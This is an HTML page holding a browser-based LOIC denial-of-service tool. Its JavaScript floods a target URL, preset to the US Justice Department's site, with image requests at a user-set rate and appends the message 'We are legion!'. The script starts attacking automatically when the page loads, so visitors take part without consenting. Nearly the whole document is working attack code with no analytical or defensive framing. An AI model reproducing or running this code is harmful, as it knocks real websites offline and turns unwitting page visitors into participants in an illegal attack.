
    
<html>
<head>
<style>
.Style1 {
        color: #000000;
       font-weight: bold;
        font-size: 18px;
}
.Style2 {color: #FF0000;}
.Style3 {color: #66FF00;}
.Style4 {color: #00FFFF;}
.Style6 {color: #FFFFFF; font-weight: bold;}
h1 {color:#FFF;}
.vids { height: 765px; width: 640px; overflow: hidden; margin-left:auto; margin-right:auto; }
.embeds { width: 640px; }
</style>
</head>
<body bgcolor="#000000">
<div class="centre">
<div style="width:1100px; overflow:hidden; padding-top:4px; float:left">
<div id="loic" style="z-index:10; width:1100px; margin-bottom:20px; height:770px;">
<div style="margin-left:auto; margin-right:auto">
<h1>LOIC DDoS</h1>
 
<p><div style="position: relative; width: 752px; height: 100%; left: -177px; top: 11px;">
 
<div style="width: 490px; height: 331px; position: absolute; left: 186px; top: -15px;">
 
  <img alt="LOIC" src="http://i2.lulzimg.com/5805b99d07.jpg" ></div>
 
<div style="width: 323px; height: 73px; position: absolute; left: 427px; top: -1px;">
 
     <fieldset style="width: 100%; height: 100%;">
 
        <legend>Step 1. Select The Target:</legend>
 
        <label>URL: <br>
 
     <input name="xD" id="targetURL" style="width: 100%;" value="http://www.justice.gov">
 
     </button>
 
     </label>
 
     <legend></legend>
 
     </fieldset>
 
</div>
 
<div style="width: 240px; height: 100px; position: absolute; left: 876px; top: -8px;">
 
  <fieldset style="width: 100%; height: 100%;">
 
  <legend>Step 2. Attack!</legend>
 
  <button id="fireButton" style="background-color:#FF0000; border-color: rgb(255, 255, 255); color: rgb(255, 255, 255); width: 240px; height: 70px;"> Stop Attacking! </button>
 
  </fieldset>
 
</div>
 
<div style="width: 685px; height: 140px; position: absolute; left: 404px; top: 110px;">
 
     <fieldset style="width: 100%; height: 100%;">
 
        <legend>Facultatif. Options d'attaque</legend>
 
        <label><span id="result_box"><span title="Requests per second">Requests per second</span></span>: <input style="width: 40px;" id="rps" value="50"></label>
 
        <p>&nbsp;</p>
 
        <label>Message:<br>
 
        <input id="message" style="width: 100%;" value="We are legion!">
 
        </label>
 
   </fieldset>
 
        <div style="width: 676px; height: 163px; position: absolute; left: 0px; top: 167px;">
 
 <fieldset style="width: 100%; height: 100%;">
 
 <legend>Status Of Attack :</legend>
 
 <dl>
 
   <dt>Sending:</dt>
 
   <dd class="Style4" id="requestedCtr">0</dd>
 
   <dt>Obtaining:</dt>
 
   <dd class="Style3" id="succeededCtr">0</dd>
 
   <dt>Failed:</dt>
 
   <dd class="Style2" id="failedCtr">0</dd>
 
 </dl>
 
 </fieldset>
 
</div>
 
</div>
 
</div>
 
<script>
 
       (function () {
 
           var fireInterval;
 
           var isFiring = false;
 
           var currentTime = new Date()
 
           var lastSuccess = currentTime.getTime();
 
           var requestedCtrNode = document.getElementById("requestedCtr"),
 
               succeededCtrNode = document.getElementById("succeededCtr"),
 
               failedCtrNode = document.getElementById("failedCtr"),
 
               targetURLNode = document.getElementById("targetURL"),
 
               fireButton = document.getElementById("fireButton"),
 
               messageNode = document.getElementById("message"),
 
               rpsNode = document.getElementById("rps"),
 
               timeoutNode = document.getElementById("timeout");
 
           var targetURL = targetURLNode.value;
 
           targetURLNode.onchange = function () {
 
               targetURL = this.value;
 
           };
 
           var requestsHT = {}; // requests hash table, may come in handy later
 
           var requestedCtr = 0,
 
               succeededCtr = 0,
 
               failedCtr = 0;
 
           var makeHttpRequest = function () {
 
                                       if ( (currentTime.getTime()-lastSuccess) > 10000) { //Allow no more than 10000 hung requests
 
                                               return;
 
                                       } else { lastSuccess = currentTime.getTime();};
   
                   var rID =Number(new Date());
 
                   var img = new Image();
 
                   img.onerror = function () { onFail(rID); };
 
                   img.onabort = function () { onFail(rID); };
 
                   img.onload = function () { onSuccess(rID); }; // TODO: it may never happen if target URL is not an image... // but probably can be fixed with different methods
 
                                       img.setAttribute("src", targetURL + "?date=" + rID + "&message=" + messageNode.value);
 
                   requestsHT[rID] = img;
 
                   onRequest(rID);
 
               };
 
           var onRequest = function (rID) {
 
                   requestedCtr++;
 
                   requestedCtrNode.innerHTML = requestedCtr;
 
               };
 
           var onComplete = function (rID) {
 
                   delete requestsHT[rID];
 
               };
 
           var onFail = function (rID) {
 
                  // failedCtr++;
 
                   //failedCtrNode.innerHTML = failedCtr;
 
                                       succeededCtr++; //Seems like the url will always fail it it isn't an image
 
                    succeededCtrNode.innerHTML = succeededCtr;
 
                    delete requestsHT[rID]; // we can't keep it forever or it would blow up the browser
 
                };
 
            var onSuccess = function (rID) {
 
                    succeededCtr++;
 
                    succeededCtrNode.innerHTML = succeededCtr;
 
                    delete requestsHT[rID];
 
                };
 
            fireButton.onclick = function () {
 
                if (isFiring) {
 
                    clearInterval(fireInterval);
 
                    isFiring = false;
 
                    this.innerHTML = "Start Attacking!!";
 
                } else {
 
                    isFiring = true;
 
                    this.innerHTML = "Stop Attacking!";
 
                    fireInterval = setInterval(makeHttpRequest, (1000 / parseInt(rpsNode.value) | 0));
 
                }
 
            };
 
        function Bombarder() {
 
                if (isFiring) {
 
                    clearInterval(fireInterval);
 
                    isFiring = false;
 
                    this.innerHTML = "Start Attacking!";
 
                } else {
 
                    isFiring = true;
 
                    this.innerHTML = "Stop Attacking!";
 
                    fireInterval = setInterval(makeHttpRequest, (1000 / parseInt(rpsNode.value) | 0));
 
                }
 
            };
 
document.getElementById("targetURL").value = "http://www.justice.gov";
 
Bombarder();
 
        })();
    </script>
    </div>
</div>
</div>
</div>
</body>
</html>